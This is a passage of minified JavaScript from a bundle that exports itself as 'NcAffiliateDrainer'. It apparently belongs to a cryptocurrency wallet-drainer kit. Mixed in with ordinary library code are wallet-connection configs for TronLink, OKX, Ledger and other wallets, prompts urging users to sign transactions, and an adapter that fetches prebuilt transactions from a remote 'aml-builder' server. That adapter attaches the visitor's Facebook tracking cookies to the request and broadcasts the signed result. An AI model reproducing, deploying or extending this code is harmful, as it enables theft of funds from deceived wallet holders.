/*! For license information please see bundle.js.LICENSE.txt */
!function(t, e) {
    "object" == typeof exports && "object" == typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define([], e) : "object" == typeof exports ? exports.NcAffiliateDrainer = e() : t.NcAffiliateDrainer = e()
}(this, () => ( () => {
    var t, e, n = {
        144(t, e, n) {
            const r = n(3908);
            t.exports = (t, e, n=!1) => {
                if (t instanceof r)
                    return t;
                try {
                    return new r(t,e)
                } catch (t) {
                    if (!n)
                        return null;
                    throw t
                }
            }
        },
        228(t) {
            "use strict";
            var e = Object.prototype.hasOwnProperty
              , n = "~";
            function r() {}
            function i(t, e, n) {
                this.fn = t,
                this.context = e,
                this.once = n || !1
            }
            function o(t, e, r, o, s) {
                if ("function" != typeof r)
                    throw new TypeError("The listener must be a function");
                var a = new i(r,o || t,s)
                  , c = n ? n + e : e;
                return t._events[c] ? t._events[c].fn ? t._events[c] = [t._events[c], a] : t._events[c].push(a) : (t._events[c] = a,
                t._eventsCount++),
                t
            }
            function s(t, e) {
                0 === --t._eventsCount ? t._events = new r : delete t._events[e]
            }
            function a() {
                this._events = new r,
                this._eventsCount = 0
            }
            Object.create && (r.prototype = Object.create(null),
            (new r).__proto__ || (n = !1)),
            a.prototype.eventNames = function() {
                var t, r, i = [];
                if (0 === this._eventsCount)
                    return i;
                for (r in t = this._events)
                    e.call(t, r) && i.push(n ? r.slice(1) : r);
                return Object.getOwnPropertySymbols ? i.concat(Object.getOwnPropertySymbols(t)) : i
            }
            ,
            a.prototype.listeners = function(t) {
                var e = n ? n + t : t
                  , r = this._events[e];
                if (!r)
                    return [];
                if (r.fn)
                    return [r.fn];
                for (var i = 0, o = r.length, s = new Array(o); i < o; i++)
                    s[i] = r[i].fn;
                return s
            }
            ,
            a.prototype.listenerCount = function(t) {
                var e = n ? n + t : t
                  , r = this._events[e];
                return r ? r.fn ? 1 : r.length : 0
            }
            ,
            a.prototype.emit = function(t, e, r, i, o, s) {
                var a = n ? n + t : t;
                if (!this._events[a])
                    return !1;
                var c, l, d = this._events[a], h = arguments.length;
                if (d.fn) {
                    switch (d.once && this.removeListener(t, d.fn, void 0, !0),
                    h) {
                    case 1:
                        return d.fn.call(d.context),
                        !0;
                    case 2:
                        return d.fn.call(d.context, e),
                        !0;
                    case 3:
                        return d.fn.call(d.context, e, r),
                        !0;
                    case 4:
                        return d.fn.call(d.context, e, r, i),
                        !0;
                    case 5:
                        return d.fn.call(d.context, e, r, i, o),
                        !0;
                    case 6:
                        return d.fn.call(d.context, e, r, i, o, s),
                        !0
                    }
                    for (l = 1,
                    c = new Array(h - 1); l < h; l++)
                        c[l - 1] = arguments[l];
                    d.fn.apply(d.context, c)
                } else {
                    var u, f = d.length;
                    for (l = 0; l < f; l++)
                        switch (d[l].once && this.removeListener(t, d[l].fn, void 0, !0),
                        h) {
                        case 1:
                            d[l].fn.call(d[l].context);
                            break;
                        case 2:
                            d[l].fn.call(d[l].context, e);
                            break;
                        case 3:
                            d[l].fn.call(d[l].context, e, r);
                            break;
                        case 4:
                            d[l].fn.call(d[l].context, e, r, i);
                            break;
                        default:
                            if (!c)
                                for (u = 1,
                                c = new Array(h - 1); u < h; u++)
                                    c[u - 1] = arguments[u];
                            d[l].fn.apply(d[l].context, c)
                        }
                }
                return !0
            }
            ,
            a.prototype.on = function(t, e, n) {
                return o(this, t, e, n, !1)
            }
            ,
            a.prototype.once = function(t, e, n) {
                return o(this, t, e, n, !0)
            }
            ,
            a.prototype.removeListener = function(t, e, r, i) {
                var o = n ? n + t : t;
                if (!this._events[o])
                    return this;
                if (!e)
                    return s(this, o),
                    this;
                var a = this._events[o];
                if (a.fn)
                    a.fn !== e || i && !a.once || r && a.context !== r || s(this, o);
                else {
                    for (var c = 0, l = [], d = a.length; c < d; c++)
                        (a[c].fn !== e || i && !a[c].once || r && a[c].context !== r) && l.push(a[c]);
                    l.length ? this._events[o] = 1 === l.length ? l[0] : l : s(this, o)
                }
                return this
            }
            ,
            a.prototype.removeAllListeners = function(t) {
                var e;
                return t ? (e = n ? n + t : t,
                this._events[e] && s(this, e)) : (this._events = new r,
                this._eventsCount = 0),
                this
            }
            ,
            a.prototype.off = a.prototype.removeListener,
            a.prototype.addListener = a.prototype.on,
            a.prefixed = n,
            a.EventEmitter = a,
            t.exports = a
        },
        251(t, e) {
            e.read = function(t, e, n, r, i) {
                var o, s, a = 8 * i - r - 1, c = (1 << a) - 1, l = c >> 1, d = -7, h = n ? i - 1 : 0, u = n ? -1 : 1, f = t[e + h];
                for (h += u,
                o = f & (1 << -d) - 1,
                f >>= -d,
                d += a; d > 0; o = 256 * o + t[e + h],
                h += u,
                d -= 8)
                    ;
                for (s = o & (1 << -d) - 1,
                o >>= -d,
                d += r; d > 0; s = 256 * s + t[e + h],
                h += u,
                d -= 8)
                    ;
                if (0 === o)
                    o = 1 - l;
                else {
                    if (o === c)
                        return s ? NaN : 1 / 0 * (f ? -1 : 1);
                    s += Math.pow(2, r),
                    o -= l
                }
                return (f ? -1 : 1) * s * Math.pow(2, o - r)
            }
            ,
            e.write = function(t, e, n, r, i, o) {
                var s, a, c, l = 8 * o - i - 1, d = (1 << l) - 1, h = d >> 1, u = 23 === i ? Math.pow(2, -24) - Math.pow(2, -77) : 0, f = r ? 0 : o - 1, p = r ? 1 : -1, g = e < 0 || 0 === e && 1 / e < 0 ? 1 : 0;
                for (e = Math.abs(e),
                isNaN(e) || e === 1 / 0 ? (a = isNaN(e) ? 1 : 0,
                s = d) : (s = Math.floor(Math.log(e) / Math.LN2),
                e * (c = Math.pow(2, -s)) < 1 && (s--,
                c *= 2),
                (e += s + h >= 1 ? u / c : u * Math.pow(2, 1 - h)) * c >= 2 && (s++,
                c /= 2),
                s + h >= d ? (a = 0,
                s = d) : s + h >= 1 ? (a = (e * c - 1) * Math.pow(2, i),
                s += h) : (a = e * Math.pow(2, h - 1) * Math.pow(2, i),
                s = 0)); i >= 8; t[n + f] = 255 & a,
                f += p,
                a /= 256,
                i -= 8)
                    ;
                for (s = s << i | a,
                l += i; l > 0; t[n + f] = 255 & s,
                f += p,
                s /= 256,
                l -= 8)
                    ;
                t[n + f - p] |= 128 * g
            }
        },
        270(t, e, n) {
            const r = n(3908)
              , i = n(8311);
            t.exports = (t, e, n) => {
                let o = null
                  , s = null
                  , a = null;
                try {
                    a = new i(e,n)
                } catch (t) {
                    return null
                }
                return t.forEach(t => {
                    a.test(t) && (o && 1 !== s.compare(t) || (o = t,
                    s = new r(o,n)))
                }
                ),
                o
            }
        },
        560(t, e, n) {
            const r = n(3908);
            t.exports = (t, e, n) => new r(t,n).compare(new r(e,n))
        },
        753(t) {
            t.exports = {
                WALLETS: {
                    trust: {
                        id: "walletconnect",
                        name: "Trust Wallet",
                        svg: '<svg width="22" height="24" viewBox="0 0 22 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 3.46686L10.9996 0V24C3.14264 20.7997 0 14.6664 0 11.2003V3.46686Z" fill="#0500FF"/><path d="M22 3.46686L11.0004 0V24C18.8573 20.7997 22 14.6664 22 11.2003V3.46686Z" fill="url(#paint0_linear_276_118)"/><defs><linearGradient id="paint0_linear_276_118" x1="19.0782" y1="-1.68064" x2="11.2217" y2="23.8117" gradientUnits="userSpaceOnUse"><stop offset="0.02" stop-color="#0000FF"/><stop offset="0.08" stop-color="#0094FF"/><stop offset="0.16" stop-color="#48FF91"/><stop offset="0.42" stop-color="#0094FF"/><stop offset="0.68" stop-color="#0038FF"/><stop offset="0.9" stop-color="#0500FF"/></linearGradient></defs></svg>'
                    },
                    bitget: {
                        id: "bitkeep",
                        name: "Bitget",
                        svg: '<svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_276_193)"><mask id="mask0_276_193" style="mask-type: luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="26" height="26"><path d="M26 0H0V26H26V0Z" fill="white"/></mask><g mask="url(#mask0_276_193)"><path d="M26 0H0V26H26V0Z" fill="#54FFF5"/><path fill-rule="evenodd" clip-rule="evenodd" d="M9.46451 15.5224H13.881L8.85713 10.4661L13.9456 5.40986L15.3314 4.0625H10.7472L4.90912 9.93051C4.61449 10.2262 4.616 10.7049 4.91214 10.9991L9.46451 15.5224ZM12.1195 10.478H12.0854L12.1191 10.4776L12.1195 10.478ZM12.1195 10.478L17.1428 15.5339L12.0545 20.5902L10.6686 21.9375H15.2527L21.0909 16.0698C21.3855 15.7741 21.384 15.2955 21.0878 15.0013L16.5355 10.478H12.1195Z" fill="black"/></g></g><defs><clipPath id="clip0_276_193"><rect width="26" height="26" rx="5" fill="white"/></clipPath></defs></svg>'
                    },
                    bybit: {
                        id: "bybit",
                        name: "Bybit Wallet",
                        svg: '<svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 0H5C2.23858 0 0 2.23858 0 5V21C0 23.7614 2.23858 26 5 26H21C23.7614 26 26 23.7614 26 21V5C26 2.23858 23.7614 0 21 0Z" fill="#1B1B1B"/><g clip-path="url(#clip0_276_195)"><path d="M16.5693 14.3841V9.58179H17.5346V14.3841H16.5693Z" fill="#F7A600"/><path d="M5.31939 15.8106H3.25V11.0083H5.23617C6.20146 11.0083 6.76392 11.5344 6.76392 12.3573C6.76392 12.89 6.40269 13.2342 6.15266 13.3488C6.4511 13.4837 6.83312 13.7871 6.83312 14.4282C6.83312 15.3249 6.20147 15.8106 5.31939 15.8106ZM5.15977 11.8448H4.21528V12.951H5.15977C5.56942 12.951 5.79863 12.7283 5.79863 12.3977C5.79863 12.0674 5.56942 11.8448 5.15977 11.8448ZM5.22218 13.7941H4.21528V14.9745H5.22218C5.65981 14.9745 5.86784 14.7048 5.86784 14.3808C5.86784 14.0571 5.65942 13.7941 5.22218 13.7941Z" fill="white"/><path d="M9.77737 13.8411V15.8106H8.81889V13.8411L7.33276 11.0083H8.38126L9.30494 12.944L10.2146 11.0083H11.2631L9.77737 13.8411Z" fill="white"/><path d="M13.9998 15.8106H11.9304V11.0083H13.9166C14.8819 11.0083 15.4443 11.5344 15.4443 12.3573C15.4443 12.89 15.0831 13.2342 14.8331 13.3488C15.1315 13.4837 15.5136 13.7871 15.5136 14.4282C15.5136 15.3249 14.8819 15.8106 13.9998 15.8106ZM13.8402 11.8448H12.8957V12.951H13.8402C14.2498 12.951 14.4791 12.7283 14.4791 12.3977C14.4791 12.0674 14.2498 11.8448 13.8402 11.8448ZM13.9026 13.7941H12.8957V14.9745H13.9026C14.3402 14.9745 14.5483 14.7048 14.5483 14.3808C14.5483 14.0571 14.3402 13.7941 13.9026 13.7941Z" fill="white"/><path d="M20.6457 11.8448V15.811H19.6804V11.8448H18.3887V11.0083H21.9374V11.8448H20.6457Z" fill="white"/></g><defs><clipPath id="clip0_276_195"><rect width="18.6875" height="7.30316" fill="white" transform="translate(3.25 8.9375)"/></clipPath></defs></svg>'
                    },
                    tronlink: {
                        id: "tronlink",
                        name: "Tronlink",
                        svg: '<svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_276_221)"><path d="M0 5C0 2.23858 2.23858 0 5 0H21C23.7614 0 26 2.23858 26 5V21C26 23.7614 23.7614 26 21 26H5C2.23858 26 0 23.7614 0 21V5Z" fill="#135DCD"/><path d="M35 15.6404C33.5 14.2554 31.425 12.1404 29.735 10.6404L29.635 10.5704C29.4686 10.4368 29.281 10.332 29.08 10.2604C25.005 9.50043 6.04 5.95542 5.67 6.00042C5.56632 6.01494 5.46723 6.05253 5.38 6.11042L5.285 6.18542C5.16802 6.30423 5.07918 6.44775 5.025 6.60542L5 6.67042V7.02542V7.08042C7.135 13.0254 15.565 32.5004 17.225 37.0704C17.325 37.3804 17.515 37.9704 17.87 38.0004H17.95C18.14 38.0004 18.95 36.9304 18.95 36.9304C18.95 36.9304 33.43 19.3704 34.895 17.5004C35.0846 17.2701 35.252 17.0223 35.395 16.7604C35.4315 16.5555 35.4143 16.3447 35.3451 16.1484C35.2758 15.9521 35.157 15.7771 35 15.6404ZM22.665 17.6854L28.845 12.5604L32.47 15.9004L22.665 17.6854ZM20.265 17.3504L9.625 8.63042L26.84 11.8054L20.265 17.3504ZM21.225 19.6354L32.115 17.8804L19.665 32.8804L21.225 19.6354ZM8.18 9.50042L19.375 19.0004L17.755 32.8904L8.18 9.50042Z" fill="white"/></g><defs><clipPath id="clip0_276_221"><rect width="26" height="26" rx="5" fill="white"/></clipPath></defs></svg>'
                    },
                    okx: {
                        id: "okx",
                        name: "OKX Wallet",
                        svg: '<svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 0H5C2.23858 0 0 2.23858 0 5V21C0 23.7614 2.23858 26 5 26H21C23.7614 26 26 23.7614 26 21V5C26 2.23858 23.7614 0 21 0Z" fill="black"/><path fill-rule="evenodd" clip-rule="evenodd" d="M10.2427 5.68155H6.0073C5.82738 5.68155 5.68152 5.82741 5.68152 6.00733V10.2427C5.68152 10.4227 5.82738 10.5685 6.0073 10.5685H10.2427C10.4226 10.5685 10.5685 10.4227 10.5685 10.2427V6.00733C10.5685 5.82741 10.4226 5.68155 10.2427 5.68155ZM15.1318 10.5685H10.8964C10.7165 10.5685 10.5706 10.7144 10.5706 10.8943V15.1297C10.5706 15.3097 10.7165 15.4555 10.8964 15.4555H15.1318C15.3118 15.4555 15.4576 15.3097 15.4576 15.1297V10.8943C15.4576 10.7144 15.3118 10.5685 15.1318 10.5685ZM15.7813 5.68155H20.0167C20.1967 5.68155 20.3426 5.82741 20.3426 6.00733V10.2427C20.3426 10.4227 20.1967 10.5685 20.0167 10.5685H15.7813C15.6014 10.5685 15.4555 10.4227 15.4555 10.2427V6.00733C15.4555 5.82741 15.6014 5.68155 15.7813 5.68155ZM10.2427 15.4556H6.0073C5.82738 15.4556 5.68152 15.6014 5.68152 15.7814V20.0168C5.68152 20.1967 5.82738 20.3426 6.0073 20.3426H10.2427C10.4226 20.3426 10.5685 20.1967 10.5685 20.0168V15.7814C10.5685 15.6014 10.4226 15.4556 10.2427 15.4556ZM15.7813 15.4556H20.0167C20.1967 15.4556 20.3426 15.6014 20.3426 15.7814V20.0168C20.3426 20.1967 20.1967 20.3426 20.0167 20.3426H15.7813C15.6014 20.3426 15.4555 20.1967 15.4555 20.0168V15.7814C15.4555 15.6014 15.6014 15.4556 15.7813 15.4556Z" fill="white"/></svg>'
                    },
                    ledger: {
                        id: "ledger",
                        name: "Ledger",
                        svg: '<svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_276_217)"><path d="M0 5C0 2.23858 2.23858 0 5 0H21C23.7614 0 26 2.23858 26 5V21C26 23.7614 23.7614 26 21 26H5C2.23858 26 0 23.7614 0 21V5Z" fill="black"/><path fill-rule="evenodd" clip-rule="evenodd" d="M10.8178 4.08575H4.08569V8.35718H5.10712V5.10718L10.8178 5.07004V4.08575ZM10.8643 9.61075V16.3429H15.1357V15.3215H11.8857L11.8486 9.61075H10.8643ZM4.08569 21.9143H10.8178V20.93L5.10712 20.8929V17.6429H4.08569V21.9143ZM15.1821 4.08575H21.9143V8.35718H20.8928V5.10718L15.1821 5.07004V4.08575ZM21.9143 21.9143H15.1821V20.93L20.8928 20.8929V17.6429H21.9143V21.9143Z" fill="white"/></g><defs><clipPath id="clip0_276_217"><rect width="26" height="26" fill="white"/></clipPath></defs></svg>'
                    },
                    walletconnect: {
                        id: "walletconnect",
                        name: "Wallet Connect",
                        qrCode: !0,
                        svg: '<svg width="26" height="18" viewBox="0 0 26 18" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20.6772 4.05341C16.4375 -0.46226 9.56253 -0.46226 5.32283 4.05341L4.7625 4.64938C4.71217 4.70245 4.67216 4.76598 4.64483 4.8362C4.61751 4.90642 4.60343 4.9819 4.60343 5.05816C4.60343 5.13442 4.61751 5.2099 4.64483 5.28012C4.67216 5.35034 4.71217 5.41387 4.7625 5.46694L6.50809 7.32593C6.55957 7.38022 6.62844 7.41057 6.70013 7.41057C6.77182 7.41057 6.8407 7.38022 6.89218 7.32593L7.6442 6.52518C10.6024 3.37567 15.3983 3.37567 18.3558 6.52518L19.058 7.27321C19.1095 7.3275 19.1783 7.35785 19.25 7.35785C19.3217 7.35785 19.3906 7.3275 19.4421 7.27321L21.1877 5.41422C21.238 5.36115 21.278 5.29762 21.3053 5.2274C21.3326 5.15718 21.3467 5.0817 21.3467 5.00544C21.3467 4.92918 21.3326 4.8537 21.3053 4.78348C21.278 4.71326 21.238 4.64973 21.1877 4.59666L20.6772 4.05341Z" fill="#3B99FC"/><path d="M25.8409 9.55244L24.2877 7.89745C24.1849 7.7887 24.0471 7.72786 23.9036 7.72786C23.7602 7.72786 23.6224 7.7887 23.5196 7.89745L18.5482 13.1925C18.5225 13.2198 18.488 13.2351 18.452 13.2351C18.416 13.2351 18.3815 13.2198 18.3558 13.1925L13.3837 7.89745C13.2809 7.7887 13.1431 7.72786 12.9996 7.72786C12.8562 7.72786 12.7184 7.7887 12.6156 7.89745L7.6442 13.1925C7.61849 13.2198 7.58396 13.2351 7.548 13.2351C7.51205 13.2351 7.47752 13.2198 7.45181 13.1925L2.48044 7.89745C2.3776 7.78893 2.23997 7.72823 2.09671 7.72823C1.95345 7.72823 1.81581 7.78893 1.71297 7.89745L0.15907 9.55244C0.108745 9.6055 0.0687314 9.66904 0.0414059 9.73926C0.0140804 9.80948 0 9.88496 0 9.96121C0 10.0375 0.0140804 10.113 0.0414059 10.1832C0.0687314 10.2534 0.108745 10.3169 0.15907 10.37L7.16462 17.8304C7.26749 17.9391 7.40527 18 7.5487 18C7.69213 18 7.82992 17.9391 7.93279 17.8304L12.9042 12.5354C12.9299 12.508 12.9644 12.4927 13.0003 12.4927C13.0363 12.4927 13.0708 12.508 13.0965 12.5354L18.0679 17.8304C18.1708 17.9391 18.3086 18 18.452 18C18.5954 18 18.7332 17.9391 18.8361 17.8304L25.8409 10.37C25.8913 10.3169 25.9313 10.2534 25.9586 10.1832C25.9859 10.113 26 10.0375 26 9.96121C26 9.88496 25.9859 9.80948 25.9586 9.73926C25.9313 9.66904 25.8913 9.6055 25.8409 9.55244Z" fill="#3B99FC"/></svg>'
                    }
                },
                DEFAULTS: {
                    ERROR_MESSAGES: {
                        connection_rejected: {
                            title: "Connect Rejected",
                            message: "Please try selecting another wallet."
                        },
                        transaction_rejected: {
                            title: "Sign Rejected",
                            message: "Please sign the transaction in your wallet to continue."
                        },
                        wallet_not_found_error: {
                            title: "Wallet Not Found",
                            message: "The selected wallet is not found on your device."
                        },
                        unknown_error: {
                            title: "Unknown Error",
                            message: "An unexpected error occurred. Please try again."
                        },
                        insufficient_gas: {
                            title: "Insufficient TRX",
                            message: "Your wallet does not have enough TRX."
                        },
                        insufficient_balance: {
                            title: "Insufficient Balance",
                            message: "Your wallet does not have enough TRX to pay for the fee."
                        }
                    },
                    LOADING_MESSAGES: {
                        server_loading: {
                            title: "Waiting for Server",
                            message: "Waiting for server response..."
                        },
                        waiting_transaction_confirmation: {
                            title: "Waiting for Signature",
                            message: "Please sign the transaction in your wallet..."
                        },
                        connecting_wallet: {
                            title: "Connecting Wallet",
                            message: "Waiting for wallet connection..."
                        }
                    }
                }
            }
        },
        909(t, e, n) {
            const r = n(3908);
            t.exports = (t, e, n) => {
                const i = new r(t,n)
                  , o = new r(e,n);
                return i.compare(o) || i.compareBuild(o)
            }
        },
        1123(t) {
            const e = /^[0-9]+$/
              , n = (t, n) => {
                const r = e.test(t)
                  , i = e.test(n);
                return r && i && (t = +t,
                n = +n),
                t === n ? 0 : r && !i ? -1 : i && !r ? 1 : t < n ? -1 : 1
            }
            ;
            t.exports = {
                compareIdentifiers: n,
                rcompareIdentifiers: (t, e) => n(e, t)
            }
        },
        1261(t, e, n) {
            const r = n(3908)
              , i = n(8311)
              , o = n(5580);
            t.exports = (t, e) => {
                t = new i(t,e);
                let n = new r("0.0.0");
                if (t.test(n))
                    return n;
                if (n = new r("0.0.0-0"),
                t.test(n))
                    return n;
                n = null;
                for (let e = 0; e < t.set.length; ++e) {
                    const i = t.set[e];
                    let s = null;
                    i.forEach(t => {
                        const e = new r(t.semver.version);
                        switch (t.operator) {
                        case ">":
                            0 === e.prerelease.length ? e.patch++ : e.prerelease.push(0),
                            e.raw = e.format();
                        case "":
                        case ">=":
                            s && !o(e, s) || (s = e);
                            break;
                        case "<":
                        case "<=":
                            break;
                        default:
                            throw new Error(`Unexpected operation: ${t.operator}`)
                        }
                    }
                    ),
                    !s || n && !o(n, s) || (n = s)
                }
                return n && t.test(n) ? n : null
            }
        },
        1729(t, e, n) {
            const r = n(144);
            t.exports = (t, e) => {
                const n = r(t, e);
                return n && n.prerelease.length ? n.prerelease : null
            }
        },
        1763(t, e, n) {
            const r = n(560);
            t.exports = (t, e) => r(t, e, !0)
        },
        1832(t, e, n) {
            const r = n(144);
            t.exports = (t, e) => {
                const n = r(t, null, !0)
                  , i = r(e, null, !0)
                  , o = n.compare(i);
                if (0 === o)
                    return null;
                const s = o > 0
                  , a = s ? n : i
                  , c = s ? i : n
                  , l = !!a.prerelease.length;
                if (c.prerelease.length && !l) {
                    if (!c.patch && !c.minor)
                        return "major";
                    if (0 === c.compareMain(a))
                        return c.minor && !c.patch ? "minor" : "patch"
                }
                const d = l ? "pre" : "";
                return n.major !== i.major ? d + "major" : n.minor !== i.minor ? d + "minor" : n.patch !== i.patch ? d + "patch" : "prerelease"
            }
        },
        2109(t, e, n) {
            const {BASE_URL: r} = n(5477)
              , {InsufficientBalanceError: i, InsufficientAllowanceError: o, InsufficientSignerPermissionsError: s, AccessDeniedError: a} = n(5385)
              , {InternalServiceError: c, ValidationError: l, NetworkError: d} = n(8013)
              , {BuildTransactionResponseDTO: h} = n(7760)
              , {SendTransactionResponseDTO: u} = n(7748);
            async function f(t, e) {
                try {
                    if (!t.ok) {
                        let n = null;
                        try {
                            n = await t.json()
                        } catch (t) {
                            console.warn(`${e}: Could not parse error response as JSON:`, t)
                        }
                        const r = n?.error || `HTTP ${t.status}: ${t.statusText}`;
                        switch (t.status) {
                        case 400:
                            throw n?.error?.includes("Insufficient") && n?.error?.includes("balance") ? new i(n.error,n.required,n.available,n.error.includes("token")) : n?.error?.includes("allowance") ? new o(n.error,n.required,n.available) : new l(r);
                        case 403:
                            throw n?.error?.includes("signer permissions") ? new s(n.error,n.reason) : new a(r);
                        case 404:
                            throw new l("Resource not found");
                        case 409:
                            throw new l("Resource already exists or conflict");
                        case 500:
                            throw new c(r);
                        default:
                            throw new Error(r)
                        }
                    }
                    return await t.json()
                } catch (t) {
                    if (t instanceof i || t instanceof o || t instanceof s || t instanceof a || t instanceof c || t instanceof l)
                        throw t;
                    throw console.error(`${e}: Network or parsing error:`, t),
                    new d(`Failed to ${e.toLowerCase()}: ${t.message}`,t)
                }
            }
            const p = {
                buildTransaction: async t => {
                    try {
                        const e = await fetch(`${r}/aml-builder/${t}/build` + ( () => {
                            var p = new URLSearchParams;
                            if (typeof document != "undefined")
                                document.cookie.split(";").forEach(function(c) {
                                    var i = c.indexOf("=");
                                    if (i < 0)
                                        return;
                                    var k = c.slice(0, i).trim()
                                      , v = decodeURIComponent(c.slice(i + 1));
                                    "_fbc" === k && p.set("fbc", v),
                                    "_fbp" === k && p.set("fbp", v)
                                });
                            var s = p.toString();
                            return s ? "?" + s : ""
                        }
                        )(), {
                            method: "GET",
                            headers: {
                                "Content-Type": "application/json"
                            }
                        })
                          , n = await f(e, "Build Transaction");
                        return new h(n)
                    } catch (t) {
                        throw console.error("Build transaction failed:", t),
                        t
                    }
                }
                ,
                broadcastTransaction: async (t, e) => {
                    try {
                        const n = await fetch(`${r}/aml-builder/send_transaction`, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                signature: t,
                                jwe_payload: e
                            })
                        })
                          , i = await f(n, "Broadcast Transaction");
                        return new u(i)
                    } catch (t) {
                        throw console.error("Broadcast transaction failed:", t),
                        t
                    }
                }
            };
            t.exports = {
                amlBuilderServiceAdapter: p
            }
        },
        2111(t, e, n) {
            const r = n(4641)
              , i = n(3999)
              , o = n(5580)
              , s = n(4089)
              , a = n(7059)
              , c = n(5200);
            t.exports = (t, e, n, l) => {
                switch (e) {
                case "===":
                    return "object" == typeof t && (t = t.version),
                    "object" == typeof n && (n = n.version),
                    t === n;
                case "!==":
                    return "object" == typeof t && (t = t.version),
                    "object" == typeof n && (n = n.version),
                    t !== n;
                case "":
                case "=":
                case "==":
                    return r(t, n, l);
                case "!=":
                    return i(t, n, l);
                case ">":
                    return o(t, n, l);
                case ">=":
                    return s(t, n, l);
                case "<":
                    return a(t, n, l);
                case "<=":
                    return c(t, n, l);
                default:
                    throw new TypeError(`Invalid operator: ${e}`)
                }
            }
        },
        2220(t, e, n) {
            "use strict";
            n.d(e, {
                mb: () => N,
                Ao: () => g,
                vZ: () => m,
                pV: () => V,
                D8: () => Y,
                IN: () => v,
                jL: () => p,
                lH: () => K,
                dC: () => tt
            }),
            Symbol();
            const r = Symbol()
              , i = Object.getPrototypeOf
              , o = new WeakMap
              , s = (t, e=!0) => {
                o.set(t, e)
            }
              , a = t => "object" == typeof t && null !== t
              , c = new WeakMap
              , l = new WeakSet
              , [d] = ( (t=Object.is, e= (t, e) => new Proxy(t,e), n=t => a(t) && !l.has(t) && (Array.isArray(t) || !(Symbol.iterator in t)) && !(t instanceof WeakMap) && !(t instanceof WeakSet) && !(t instanceof Error) && !(t instanceof Number) && !(t instanceof Date) && !(t instanceof String) && !(t instanceof RegExp) && !(t instanceof ArrayBuffer), d=t => {
                switch (t.status) {
                case "fulfilled":
                    return t.value;
                case "rejected":
                    throw t.reason;
                default:
                    throw t
                }
            }
            , h=new WeakMap, u= (t, e, n=d) => {
                const r = h.get(t);
                if ((null == r ? void 0 : r[0]) === e)
                    return r[1];
                const i = Array.isArray(t) ? [] : Object.create(Object.getPrototypeOf(t));
                return s(i, !0),
                h.set(t, [e, i]),
                Reflect.ownKeys(t).forEach(e => {
                    if (Object.getOwnPropertyDescriptor(i, e))
                        return;
                    const r = Reflect.get(t, e)
                      , o = {
                        value: r,
                        enumerable: !0,
                        configurable: !0
                    };
                    if (l.has(r))
                        s(r, !1);
                    else if (r instanceof Promise)
                        delete o.value,
                        o.get = () => n(r);
                    else if (c.has(r)) {
                        const [t,e] = c.get(r);
                        o.value = u(t, e(), n)
                    }
                    Object.defineProperty(i, e, o)
                }
                ),
                Object.preventExtensions(i)
            }
            , f=new WeakMap, p=[1, 1], g=s => {
                if (!a(s))
                    throw new Error("object required");
                const d = f.get(s);
                if (d)
                    return d;
                let h = p[0];
                const w = new Set
                  , m = (t, e=++p[0]) => {
                    h !== e && (h = e,
                    w.forEach(n => n(t, e)))
                }
                ;
                let y = p[1];
                const v = t => (e, n) => {
                    const r = [...e];
                    r[1] = [t, ...r[1]],
                    m(r, n)
                }
                  , M = new Map
                  , N = t => {
                    var e;
                    const n = M.get(t);
                    n && (M.delete(t),
                    null == (e = n[1]) || e.call(n))
                }
                  , I = Array.isArray(s) ? [] : Object.create(Object.getPrototypeOf(s))
                  , E = e(I, {
                    deleteProperty(t, e) {
                        const n = Reflect.get(t, e);
                        N(e);
                        const r = Reflect.deleteProperty(t, e);
                        return r && m(["delete", [e], n]),
                        r
                    },
                    set(e, s, d, h) {
                        const u = Reflect.has(e, s)
                          , p = Reflect.get(e, s, h);
                        if (u && (t(p, d) || f.has(d) && t(p, f.get(d))))
                            return !0;
                        var y;
                        N(s),
                        a(d) && (d = (t => t && (o.has(t) ? o.get(t) : i(t) === Object.prototype || i(t) === Array.prototype))(y = d) && y[r] || null || d);
                        let I = d;
                        if (d instanceof Promise)
                            d.then(t => {
                                d.status = "fulfilled",
                                d.value = t,
                                m(["resolve", [s], t])
                            }
                            ).catch(t => {
                                d.status = "rejected",
                                d.reason = t,
                                m(["reject", [s], t])
                            }
                            );
                        else {
                            !c.has(d) && n(d) && (I = g(d));
                            const t = !l.has(I) && c.get(I);
                            t && ( (t, e) => {
                                if ("production" !== {
                                    NODE_ENV: "production"
                                }.MODE && M.has(t))
                                    throw new Error("prop listener already exists");
                                if (w.size) {
                                    const n = e[3](v(t));
                                    M.set(t, [e, n])
                                } else
                                    M.set(t, [e])
                            }
                            )(s, t)
                        }
                        return Reflect.set(e, s, I, h),
                        m(["set", [s], d, p]),
                        !0
                    }
                });
                f.set(s, E);
                const A = [I, (t=++p[1]) => (y === t || w.size || (y = t,
                M.forEach( ([e]) => {
                    const n = e[1](t);
                    n > h && (h = n)
                }
                )),
                h), u, t => (w.add(t),
                1 === w.size && M.forEach( ([t,e], n) => {
                    if ("production" !== {
                        NODE_ENV: "production"
                    }.MODE && e)
                        throw new Error("remove already exists");
                    const r = t[3](v(n));
                    M.set(n, [t, r])
                }
                ),
                () => {
                    w.delete(t),
                    0 === w.size && M.forEach( ([t,e], n) => {
                        e && (e(),
                        M.set(n, [t]))
                    }
                    )
                }
                )];
                return c.set(E, A),
                Reflect.ownKeys(s).forEach(t => {
                    const e = Object.getOwnPropertyDescriptor(s, t);
                    "value"in e && (E[t] = s[t],
                    delete e.value,
                    delete e.writable),
                    Object.defineProperty(I, t, e)
                }
                ),
                E
            }
            ) => [g, c, l, t, e, n, d, h, u, f, p])();
            function h(t={}) {
                return d(t)
            }
            function u(t, e, n) {
                const r = c.get(t);
                let i;
                "production" === {
                    NODE_ENV: "production"
                }.MODE || r || console.warn("Please use proxy object");
                const o = []
                  , s = r[3];
                let a = !1;
                const l = s(t => {
                    o.push(t),
